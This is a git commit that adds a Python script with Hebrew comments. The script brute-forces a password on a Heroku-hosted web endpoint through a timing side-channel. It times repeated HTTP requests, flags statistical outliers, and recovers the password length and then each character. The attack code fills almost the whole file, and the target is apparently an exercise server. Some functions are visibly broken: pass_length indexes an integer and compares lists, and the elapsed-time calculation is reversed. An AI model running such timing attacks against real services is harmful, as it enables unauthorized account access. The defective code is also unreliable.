03405e1877f1cc181af7d058b28f426e713a8ab2
nogaklein <71371000+nogaklein@users.noreply.github.com>
2020-11-30 00:32:31 +0200

    Create findourpass.py

---
+++ findourpass.py
@@ -0,0 +1,103 @@
+import requests
+import time
+import math
+
+MAX_LEN = 33
+
+url = r'https://fast-forest-91279.herokuapp.com/'
+started = time.time()
+POOL = 'Hasod5ShelN9ogGaVeAdi420'
+
+
+# מחשבת ממוצע
+def mean(values):
+    sum = 0.0
+    for value in values:
+        sum += value
+    return sum / len(values)
+
+
+# מחשב סטיית תקן סטנדרטית
+def standard_deviation(values):
+    tempSum = 0
+    mean1 = mean(values)
+    for value in values:
+        tempSum += math.pow((value - mean1), 2)
+    std = math.sqrt(tempSum / len(values))
+    return std
+
+# מציאת חריגים
+def outliers(samples, threshold):
+    mean1 = mean(samples.values())
+    std = standard_deviation(samples.values())
+    ol = {}
+    for item in samples:
+        print(f'{item}, {samples[item]}, {mean1}, {std}')
+        if samples[item] > (mean1 + std * threshold):
+            ol[item] = samples[item]
+    return ol
+
+
+# check 'repeat' times the duration for request/response to specific url (url2check)
+# return array with measured duration of requestqresponse to url
+def timeit(url2check, repeat=1):
+    tt = []
+    for _ in range(repeat):
+        start = time.time()
+        r = requests.get(url2check, allow_redirects=True)
+        end = time.time()
+        tt.append(end - start)
+    return tt
+
+
+# find the password length
+# logic: search for average highest duration
+# assumption: duration for the correct length is higher than for length for incorrect length
+def pass_length(passStartLength=1):
+    check_length = passStartLength
+    found = False
+    url1 = url + '/' + "".ljust(check_length, '_')
+    standart = standard_deviation(timeit(url1, 10)) + timeit(url1, 1)
+    while not found:
+        print(f'checking password length {check_length}: min time {check_length[-1]}')
+        check_length += 1
+        url1 = url + '/' + "".ljust(check_length, '_')
+        if timeit(url1, 10) > standart:
+            found = True
+    return check_length
+
+# מציאת הסיסמה על פי אורכה
+def find_password(length):
+    passw = ""
+    goodDict = {}
+    for j in range(length - 1):
+        goodDict = {}
+        checks = []
+        for i in range(len(POOL)):
+            url1 = url + '/' + (passw + POOL[i] + "_" * (length - 1 - j))
+            print(f'checking for: {url1}')
+            checks.append(min(timeit(url1, 2)))
+            print(f'min time {checks[-1]}')
+            goodDict[POOL[i]] = checks[-1]
+        goodDict = outliers(goodDict, 0.2)
+        if len(passw) != 3:
+            passw += max(goodDict.keys(), key=(lambda k: goodDict[k]))
+        else:
+            passw += min(goodDict.keys(), key=(lambda k: goodDict[k]))
+        print(passw)
+    return passw
+
+# מציאת התו האחרון בסיסמה
+def find_pass_last_char(passw):
+    for i in POOL:
+        url1 = url + '/' + (passw + i)
+        print(f'checking for: {str(passw + i)}')
+        r = requests.get(url1, allow_redirects=True)
+        if r.content == b'1':
+            print(f'password found: {str(passw + i)}')
+            return str(passw + i)
+
+
+print(find_pass_last_char(find_password(21)))
+ended = time.time()
+print("time" + str(started - ended))
